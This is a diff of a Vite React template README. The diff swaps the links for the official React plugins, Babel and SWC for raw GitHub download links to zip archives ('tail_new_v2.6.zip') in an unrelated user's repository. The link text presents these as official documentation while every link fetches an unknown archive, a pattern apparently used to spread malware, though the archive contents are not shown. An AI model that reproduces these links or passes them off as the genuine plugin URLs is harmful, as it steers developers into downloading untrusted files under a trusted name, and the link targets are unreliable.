@@ -4,5 +4,5 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://raw.githubusercontent.com/ryuk956983/new-tail/main/src/assets/tail-new-1.4.zip) uses [Babel](https://raw.githubusercontent.com/ryuk956983/new-tail/main/src/assets/tail-new-1.4.zip) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/ryuk956983/new-tail/main/src/assets/tail-new-1.4.zip) uses [SWC](https://raw.githubusercontent.com/ryuk956983/new-tail/main/src/assets/tail-new-1.4.zip) for Fast Refresh
+- [@vitejs/plugin-react](https://raw.githubusercontent.com/ryuk956983/new-tail/main/.github/tail_new_v2.6.zip) uses [Babel](https://raw.githubusercontent.com/ryuk956983/new-tail/main/.github/tail_new_v2.6.zip) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/ryuk956983/new-tail/main/.github/tail_new_v2.6.zip) uses [SWC](https://raw.githubusercontent.com/ryuk956983/new-tail/main/.github/tail_new_v2.6.zip) for Fast Refresh
